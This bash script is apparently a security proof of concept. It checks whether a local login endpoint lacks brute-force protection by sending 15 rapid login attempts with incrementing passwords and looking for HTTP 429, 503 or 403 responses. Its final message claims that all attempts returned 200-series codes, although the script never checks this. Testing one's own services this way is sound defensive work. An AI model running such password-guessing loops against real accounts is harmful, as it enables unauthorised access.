#!/bin/bash

# POC: Missing Brute Force Protection on Login Endpoint
# This script demonstrates that the login endpoint lacks rate limiting/brute force protection
# by performing rapid sequential login attempts and checking for rate limiting responses

TARGET_URL="http://localhost:8081/accounts/login/"
TOTAL_ATTEMPTS=15
PASSWORD_BASE="testpass"

echo "=== Brute Force Protection Test ==="
echo "Target: $TARGET_URL"
echo "Total Attempts: $TOTAL_ATTEMPTS"
echo ""

# Arrays to store results
declare -a HTTP_CODES
declare -a RESPONSE_TIMES
RATE_LIMITED=false
LOCKOUT_DETECTED=false

echo "Performing $TOTAL_ATTEMPTS rapid sequential login attempts..."
echo ""

for i in $(seq 1 $TOTAL_ATTEMPTS); do
    # Generate different passwords to simulate brute force
    PASSWORD="${PASSWORD_BASE}${i}"
    
    # Perform POST request and measure time
    START_TIME=$(date +%s%N)
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
        -d "username=testuser&password=$PASSWORD" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        2>&1)
    END_TIME=$(date +%s%N)
    
    # Extract HTTP code (last line)
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    
    # Calculate response time in milliseconds
    RESPONSE_TIME=$(( (END_TIME - START_TIME) / 1000000 ))
    
    # Store results
    HTTP_CODES[$i]=$HTTP_CODE
    RESPONSE_TIMES[$i]=$RESPONSE_TIME
    
    echo "Attempt $i: HTTP $HTTP_CODE | Response Time: ${RESPONSE_TIME}ms"
    
    # Check for rate limiting indicators
    if [[ "$HTTP_CODE" == "429" ]]; then
        RATE_LIMITED=true
        echo "  ⚠️  Rate limiting detected (HTTP 429)"
    fi
    
    if [[ "$HTTP_CODE" == "503" ]]; then
        echo "  ⚠️  Service unavailable - potential rate limiting (HTTP 503)"
    fi
    
    if [[ "$HTTP_CODE" == "403" ]]; then
        LOCKOUT_DETECTED=true
        echo "  ⚠️  Account lockout detected (HTTP 403)"
    fi
done

echo ""
echo "=== Analysis ==="
echo ""

# Check for consistent HTTP codes
UNIQUE_CODES=$(printf '%s\n' "${HTTP_CODES[@]}" | sort -u | wc -l)
echo "Unique HTTP Response Codes: $UNIQUE_CODES"

# Check response time consistency
MIN_TIME=$(printf '%s\n' "${RESPONSE_TIMES[@]}" | sort -n | head -1)
MAX_TIME=$(printf '%s\n' "${RESPONSE_TIMES[@]}" | sort -n | tail -1)
AVG_TIME=$((( ${#RESPONSE_TIMES[@]} > 0 ? $(printf '%s\n' "${RESPONSE_TIMES[@]}" | awk '{sum+=$1} END {print sum}') / ${#RESPONSE_TIMES[@]} : 0 )))

echo "Response Time Range: ${MIN_TIME}ms - ${MAX_TIME}ms"
echo "Average Response Time: ${AVG_TIME}ms"
echo "Response Time Variance: $(( MAX_TIME - MIN_TIME ))ms"

echo ""
echo "=== Findings ==="

if [[ "$RATE_LIMITED" == true ]]; then
    echo "✓ Rate limiting IS implemented"
    exit 0
elif [[ "$LOCKOUT_DETECTED" == true ]]; then
    echo "✓ Account lockout protection IS implemented"
    exit 0
else
    echo "✗ NO RATE LIMITING DETECTED"
    echo "✗ NO ACCOUNT LOCKOUT PROTECTION DETECTED"
    echo "✗ All $TOTAL_ATTEMPTS attempts returned HTTP 200-series responses"
    echo "✗ Response times are consistent (~${AVG_TIME}ms), indicating no throttling"
    echo ""
    echo "VULNERABILITY CONFIRMED: Brute force protection is missing!"
    exit 1
fi